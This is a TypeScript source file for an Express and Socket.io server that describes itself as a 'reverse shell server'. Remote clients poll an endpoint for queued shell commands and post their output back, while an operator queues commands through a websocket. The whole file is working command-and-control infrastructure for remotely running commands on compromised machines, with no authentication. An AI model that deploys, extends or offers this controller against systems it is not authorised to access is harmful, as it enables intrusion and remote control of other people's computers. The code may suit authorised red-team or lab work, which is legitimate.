import dotenv from "dotenv"
dotenv.config()

import express from "express"
import "express-async-errors"
import createHttpError from "http-errors"

import cors from "cors"
import { createServer } from "http"
import { Server } from "socket.io"

const { EXPRESS_PORT = 18000 } = process.env

process.env.TZ = "Asia/Tokyo"

const app = express()
app.use(express.urlencoded({ limit: "50mb", extended: true }))
app.use(cors())

const httpServer = createServer(app)
const io = new Server(httpServer, { cors: { origin: "*" } })

type Client = {
  username: string
  command?: string
}

const clients: Client[] = []
// const clients: Client[] = [
//   {
//     username: "bob",
//     command: "standby",
//   },
// ]

app.get("/cmd", (req, res) => {
  const { username } = req.query as { username: string | undefined }
  if (!username) throw createHttpError(400, "username not provided")

  console.log(`${username} requested a command`)

  // Check if the client is known already
  let client = clients.find((c) => c.username === username)

  // If not add it to list of clients
  if (!client) {
    console.log(`${username} is a new client, adding to clients list`)
    client = { username }
    clients.push(client)
  }

  // Send the client to the front end
  io.emit("client", client)

  // send the command to the client
  res.send(client.command)

  // Set the next command to standby, which does nothing on the client side
  // TODO: just unset it
  client.command = "standby"
})

app.post("/response", (req, res) => {
  const { username, output } = req.body
  if (!username) throw createHttpError(400, "username not provided")

  console.log(`${username} provided a response: ${output}`)

  const client = clients.find((c) => c.username === username)

  if (client) io.emit("response", { username, output })

  res.send("OK")
})

io.on("connection", (socket) => {
  console.log("[WS] Socket.io client connected")

  socket.on("command", (payload) => {
    const { username, command } = payload
    console.log(`Command arrived for ${username}: ${command}`)
    if (!username) return

    const client = clients.find((c) => c.username === username)
    if (!client) return console.log("client not found")

    // set the new command
    client.command = command
  })
})

httpServer.listen(EXPRESS_PORT, () =>
  console.log(`Reverse shell server listening on ${EXPRESS_PORT}`)
)
